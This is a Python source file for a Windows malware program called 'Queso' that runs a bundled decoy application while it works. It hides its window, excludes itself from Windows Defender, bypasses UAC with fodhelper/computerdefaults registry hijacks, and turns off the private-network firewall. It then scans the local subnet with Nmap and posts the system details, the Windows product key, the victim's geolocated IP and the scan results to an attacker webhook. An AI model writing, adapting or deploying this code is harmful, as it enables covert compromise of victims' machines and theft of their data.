import os
import sys
import subprocess
import ctypes
from threading import Thread
from urllib3 import PoolManager
import json
import random
import nmap3
from xml.etree import ElementTree
import zipfile


class Syscalls:

    @staticmethod
    def HideConsole() -> None:
        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)


class Utility:

    @staticmethod
    def GetSelf() -> tuple[str, bool]: # Get the location of the file and whether exe mode is enabled or not
        if hasattr(sys, "frozen"):
            return (sys.executable, True)
        else:
            return (__file__, False)

    @staticmethod
    def ExcludeFromDefender(filepath: str = None) -> None: # Exclude a file from Windows Defender
        if filepath is None:
            filepath = Utility.GetSelf()[0]
        subprocess.Popen(
            "powershell -Command Add-MpPreference -ExclusionPath '{}'".format(filepath),
            shell= True, creationflags= subprocess.CREATE_NEW_CONSOLE | subprocess.SW_HIDE
        )

    @staticmethod
    def IsAdmin() -> bool:
        return subprocess.run("net session", shell= True, capture_output= True).returncode == 0

    @staticmethod
    def UACbypass(bypass_method: int = 1) -> None: # Bypass UAC
        if Utility.GetSelf()[1]:
            execute = lambda cmd: subprocess.run(cmd, shell= True, capture_output= True).returncode == 0
        
            if bypass_method == 1:
                if not execute(f"reg add hkcu\Software\\Classes\\ms-settings\\shell\\open\\command /d \"{sys.executable}\" /f"): Utility.UACbypass(2)
                if not execute("reg add hkcu\Software\\Classes\\ms-settings\\shell\\open\\command /v \"DelegateExecute\" /f"): Utility.UACbypass(2)
                execute("computerdefaults --nouacbypass")
                execute("reg delete hkcu\Software\\Classes\\ms-settings /f")
            
            elif bypass_method == 2:
                execute(f"reg add hkcu\Software\\Classes\\ms-settings\\shell\\open\\command /d \"{sys.executable}\" /f")
                execute("reg add hkcu\Software\\Classes\\ms-settings\\shell\\open\\command /v \"DelegateExecute\" /f")
                execute("fodhelper --nouacbypass")
                execute("reg delete hkcu\Software\\Classes\\ms-settings /f")

            os._exit(0)

    @staticmethod
    def GetRandomString(length: int = 5, invisible: bool = False) -> str: # Generates a random string
        if invisible:
            return "".join(random.choices(["\xa0", chr(8239)] + [chr(x) for x in range(8192, 8208)], k= length))
        else:
            return "".join(random.choices("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789", k= length))
        

class Network:

    @staticmethod
    def GetNetAdapters() -> list[str]: # Get a list of network adapters
        adapters = list()
        cmd = subprocess.run(
            "powershell -Command Get-NetAdapter -Name *",
            shell= True, stdout= subprocess.PIPE, stderr= subprocess.PIPE
        )
        lines_out = cmd.stdout.decode('utf-8').split('\n')
        for line_out in lines_out:
            if line_out.startswith("Name") or line_out.startswith("----") or line_out.isspace():
                pass
            else:
                print(line_out)
                adapter = line_out.split("   ")[0]
                if "..." in adapter:
                    pass
                else:
                    adapters.append(adapter)
        return adapters
    
    @staticmethod
    def GetNetConnection(adapter: str) -> str: # Get an adapter's network connection
        cmd = subprocess.run(
            "powershell -Command Get-NetConnectionProfile -InterfaceAlias \"{}\"".format(adapter),
            shell= True, stdout= subprocess.PIPE, stderr= subprocess.PIPE
        )
        lines_out = cmd.stdout.decode('utf-8').split('\n')
        connection = ""
        for line_out in lines_out:
            if line_out.startswith("Name"):
                connection = line_out.split(" : ")[1]
                break
        if connection:
            return connection
        return "None"

    @staticmethod
    def DisableFirewall() -> None:
        adapters = Network.GetNetAdapters()
        for adapter in adapters: # Loop over all adapters
            print(adapter)
            connection = Network.GetNetConnection(adapter)
            if connection == "None":
                pass
            else: # Set network type to private
                subprocess.Popen(
                    "powershell -Command Set-NetConnectionProfile -Name '{}' -NetworkCategory Private".format(connection),
                    shell= True
                )
            # Disable firewall on private networks
        subprocess.Popen(
            "powershell -Command Set-NetFirewallProfile -Profile Private -Enabled False",
            shell= True
        )

    @staticmethod
    def ExcludeFromFirewall(filepath: str = None) -> None: # Exclude a file from Windows Firewall
        if filepath is None:
            filepath = Utility.GetSelf()[0]
        subprocess.Popen("netsh advfirewall firewall add rule name='tcpclient' dir='in' action='allow' program='{}'".format(filepath))

    @staticmethod
    def InstallNmap() -> None: # Install Nmap
        with zipfile.ZipFile(os.path.join(sys._MEIPASS, "nmap.zip"), "r") as zip:
            zip.extractall("C:\\Program Files (x86)")

    @staticmethod
    def NmapScan(ip_range: str, nmap_arguments: str ="-sV -T4 -O -F --version-light") -> ElementTree: # Perform an Nmap scan
        nmap_session = nmap3.Nmap()
        return nmap_session.scan_command(ip_range, nmap_arguments)
        

class Tasks:

    task_threads: list[Thread] = list()

    @staticmethod
    def AddTask(task: Thread) -> None:
        Tasks.task_threads.append(task)

    @staticmethod
    def WaitForAll() -> None:
        for task_thread in Tasks.task_threads:
            task_thread.join()


class Queso:

    Webhook: str = "%webhook%"
    TempFolder: str = None

    def __init__(self) -> None:
        while True:
            self.TempFolder = os.path.join(os.getenv("temp"), Utility.GetRandomString(10, True))
            if not os.path.isdir(self.TempFolder):
                os.makedirs(self.TempFolder, exist_ok= True)
                break

        user_tasks = (
            (self.LaunchBoundApplication, False),
            (self.SendData, False)
        )

        admin_tasks = (
            
        )

        Syscalls.HideConsole()
        Utility.ExcludeFromDefender()

        if not Utility.IsAdmin(): # If not an admin, try to be one
            if Utility.GetSelf()[1] and not "--no-bypass" in sys.argv:
                    Utility.UACbypass()

        if Utility.IsAdmin(): # We're admin now
            Network.DisableFirewall()
            Network.ExcludeFromFirewall()

            if not os.path.exists("C:\\Program Files (x86)\\Nmap"): # Install Nmap if it doesn't exist
                Network.InstallNmap()

            for func, daemon in admin_tasks: # Start admin tasks
                admin_task_thread = Thread(target= func, daemon= daemon)
                admin_task_thread.start()
                Tasks.AddTask(admin_task_thread)

        for func, daemon in user_tasks: # Start user tasks
            user_task_thread = Thread(target= func, daemon= daemon)
            user_task_thread.start()
            Tasks.AddTask(user_task_thread)

        Tasks.WaitForAll()

    def LaunchBoundApplication(self) -> None: # Launch the bound application
        boundExePath = os.path.join(sys._MEIPASS, "bound", "bound.exe")
        if os.path.isfile(boundExePath):
            subprocess.Popen("{}".format(boundExePath))

    def SendData(self) -> None: # Send gathered data to the webhook

        # Gather system information
        computerName = os.getenv("computername")
        computerOS = subprocess.run('wmic os get Caption', capture_output= True, shell= True).stdout.decode(errors= 'ignore').strip().splitlines()[2].strip()
        computerUUID = subprocess.run('wmic csproduct get uuid', capture_output= True, shell= True).stdout.decode(errors= 'ignore').strip().split()[1]
        cpu = subprocess.run("powershell Get-ItemPropertyValue -Path 'HKLM:System\\CurrentControlSet\\Control\\Session Manager\\Environment' -Name PROCESSOR_IDENTIFIER", capture_output= True, shell= True).stdout.decode(errors= 'ignore').strip()
        gpu = subprocess.run("wmic path win32_VideoController get name", capture_output= True, shell= True).stdout.decode(errors= 'ignore').splitlines()[2].strip()
        productKey = subprocess.run("powershell Get-ItemPropertyValue -Path 'HKLM:SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SoftwareProtectionPlatform' -Name BackupProductKeyDefault", capture_output= True, shell= True).stdout.decode(errors= 'ignore').strip()

        sys_info = f"""
            \nComputer Name: {computerName}
            \nOS: {computerOS}
            \nUUID: {computerUUID}
            \nCPU: {cpu}
            \nGPU: {gpu}
            \nProduct Key: {productKey}
        """

        http_manager = PoolManager()

        try: # Try to gather IP information
            result: dict = json.loads(http_manager.request("GET", "http://ip-api.com/json/").data.decode())
            if result.get("status") != "success":
                raise Exception("Failed to retrieve IP info")
            data = f"""
                \nIP: {result['query']}
                \nCountry: {result['country']}
                \nTimezone: {result['timezone']}
                \nRegion: {result['regionName']}
                \nZIP: {result['zip']}
                \nCoordinates: [{result['lat']}, {result['lon']}]
                \nISP: {result['isp']}
            """
        except Exception: # Throw an error if we can't
            ip_info = "(No IP info)"
        else:
            ip_info = data

        # Create the embed
        payload = {
            "embeds": [
                {
                    "title": "Queso Project",
                    "description": f"""
                        __System Info__
                        \n```autohotkey\n{sys_info}```
                        \n__IP Info__
                        \n```prolog\n{ip_info}```
                    """,
                    "footer": {
                        "text": "Information by Queso"
                    }
                }
            ],
            "username": "Queso"
        }

        fields = dict()

        # Append a network scan if we can make one
        networkscan = Network.NmapScan("192.168.1.1/24")
        if networkscan:
            fields['file'] = ("{}.xml".format(computerUUID), ElementTree.tostring(networkscan))

        fields['payload_json'] = json.dumps(payload).encode() # Append the embed
        http_manager.request("POST", self.Webhook, fields= fields) # Bon voyage!


if os.name == "nt":

    queso = Queso()
